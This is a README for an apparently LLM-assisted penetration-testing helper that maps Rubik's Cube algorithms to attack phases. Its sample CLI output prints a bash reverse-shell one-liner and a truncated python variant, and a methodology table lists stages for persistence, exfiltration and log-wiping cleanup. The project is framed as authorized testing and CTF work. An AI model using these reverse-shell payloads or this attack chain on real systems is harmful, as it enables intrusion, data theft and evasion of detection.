# 🧠 StrategicKhaos CTF Brain

**Distributed Cognitive Orchestration Engine**

> *"See state → Recognize pattern → Execute algorithm → Objective achieved"*

A sovereign AI-powered system that maps Rubik's Cube PLL algorithms to penetration testing methodologies. Just as a speedcuber recognizes a cube state and executes the corresponding algorithm, CTF Brain recognizes security scenarios and routes to the appropriate tools and techniques.

---

## 🎯 Philosophy

Like solving a Rubik's cube:
- **01-Ua (Recon)** → `M'2 U M U2 M' U M'2` → Scan, discover, map
- **02-Ub (Enum)** → `M'2 U' M U2 M' U' M'2` → Enumerate, list, identify
- **03-H (WebApp)** → `M'2 U M'2 U2 M'2 U M'2` → Inject, exploit, bypass
- **04-Z (Exploit)** → Gain foothold, get shell
- And so on through PrivEsc → Persist → Exfil → Cleanup

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         USER QUERY                              │
│              "scan for open ports on 10.0.0.1"                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    QUERY CLASSIFIER                             │
│  Keyword matching → LLM classification → Node assignment        │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                  METHODOLOGY GRAPH                              │
│  NetworkX DiGraph with nodes (tools) and edges (transitions)    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                 4-QUADRANT SCORING                              │
│  Tool availability × Context match × Success rate × Efficiency  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    RECOMMENDED TOOLS + NEXT MOVES               │
└─────────────────────────────────────────────────────────────────┘
```

## 🚀 Quick Start

### Local Development

```bash
# Clone
git clone https://github.com/strategickhaos/Sovereignty-Architecture-Elevator-Pitch-.git
cd Sovereignty-Architecture-Elevator-Pitch-

# Install dependencies
pip install -r requirements.txt

# Run CLI
python src/main.py
```

### Docker

```bash
# Build
docker build -t ctf-brain .

# Run interactive
docker run -it ctf-brain

# Run proxy module
docker run -it ctf-brain python src/netcat_proxy.py
```

### Kubernetes (GKE)

```bash
# Apply manifests
kubectl apply -f kubernetes/gke-ctf-brain.yaml

# Check deployment
kubectl get pods -n ctf-tools
```

## 💻 Usage

### CTF Brain CLI

```
╔══════════════════════════════════════════════════════════════════╗
║           STRATEGICKHAOS CTF BRAIN v1.0                         ║
║     Distributed Cognitive Orchestration Engine                   ║
╚══════════════════════════════════════════════════════════════════╝

ctf> scan for open ports
╭──────────────────────────────────────────────────────────────────╮
│ 📍 Node: 01-Ua-Recon                                            │
│ 📛 Name: Reconnaissance                                          │
│ 🎲 PLL:  Ua Perm - M'2 U M U2 M' U M'2                          │
├──────────────────────────────────────────────────────────────────┤
│ 🛠️  Tools: nmap, masscan, shodan, whois, dig                     │
│ ➡️  Next:  02-Ub-Enum, 03-H-WebApp                               │
│ 🎯 Confidence: 85% (keyword)                                     │
╰──────────────────────────────────────────────────────────────────╯

ctf> next
➡️  Next moves from 01-Ua-Recon:
  02-Ub-Enum: 0.78 (tools:0.70 ctx:0.85)
  03-H-WebApp: 0.72 (tools:0.65 ctx:0.80)
```

### Netcat Proxy CLI

```
╔══════════════════════════════════════════════════════════════════╗
║           STRATEGICKHAOS NETCAT PROXY v1.0                      ║
║               Sovereign Network Operations                       ║
╚══════════════════════════════════════════════════════════════════╝

nc> listen 4444 reverse shell
[+] Listener started on port 4444 (reverse shell)

nc> shells 10.10.14.5 4444
🐚 Reverse Shell Payloads:
[bash]
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
[python]
python3 -c 'import socket,subprocess,os;...'

nc> relay 8080 10.10.10.5 80
[+] Relay created: localhost:8080 → 10.10.10.5:80
```

## 📊 Methodology Nodes

| Node | Name | PLL Analog | Key Tools |
|------|------|------------|-----------|
| 01-Ua | Recon | Ua Perm | nmap, masscan, shodan |
| 02-Ub | Enum | Ub Perm | gobuster, enum4linux |
| 03-H | WebApp | H Perm | burp, sqlmap, nikto |
| 04-Z | Exploit | Z Perm | metasploit, nc |
| 05-Aa | Creds | Aa Perm | hydra, hashcat |
| 06-Ab | PrivEsc | Ab Perm | linpeas, winpeas |
| 07-E | Persist | E Perm | cron, registry |
| 08-T | Exfil | T Perm | nc, curl, dns |
| 09-F | Pivot | F Perm | chisel, ligolo |
| 10-V | Cleanup | V Perm | shred, wevtutil |

## 🔧 Configuration

### Environment Variables

```bash
OLLAMA_HOST=http://localhost:11434  # Local LLM endpoint
GRAPH_CONFIG=/path/to/methodology_graph.json
```

### GitHub Actions Secrets (for GKE deployment)

```
GCP_PROJECT_ID      # Your GCP project
GKE_CLUSTER_NAME    # GKE cluster name
GKE_ZONE            # Cluster zone (e.g., us-central1-a)
GCP_SA_KEY          # Service account JSON (base64)
```

## 🧪 Testing

```bash
# Run all tests
pytest tests/ -v

# Run specific test class
pytest tests/test_classification.py::TestClassification -v

# With coverage
pytest tests/ --cov=src --cov-report=html
```

## 📁 Project Structure

```
Sovereignty-Architecture-Elevator-Pitch-/
├── .github/workflows/
│   ├── ci.yaml              # Lint, test, build
│   └── deploy-gke.yaml      # Auto-deploy to GKE
├── kubernetes/
│   └── gke-ctf-brain.yaml   # K8s manifests
├── src/
│   ├── main.py              # CTF Brain CLI
│   ├── netcat_proxy.py      # Proxy module
│   └── methodology_graph.json
├── tests/
│   └── test_classification.py
├── Dockerfile
├── requirements.txt
└── CTF_BRAIN_README.md
```

## 🛡️ Security Notes

- This tool is for **authorized penetration testing only**
- Always obtain proper authorization before testing
- The proxy module can catch shells - use responsibly
- Deployed on your own sovereign infrastructure

## 🤝 Contributing

1. Add new methodology nodes to `methodology_graph.json`
2. Add tools to existing nodes
3. Create new edge connections for methodology flows
4. Submit PR with tests

## 📜 License

**Sovereign** - No vendor lock-in. Run on your infrastructure.

---

**Author**: Dom (Me10101) - Strategickhaos DAO LLC  
**Mission**: Building sovereign AI ecosystems for security research and automation

*"The lattice doesn't respond to claims. It responds to coherence."*
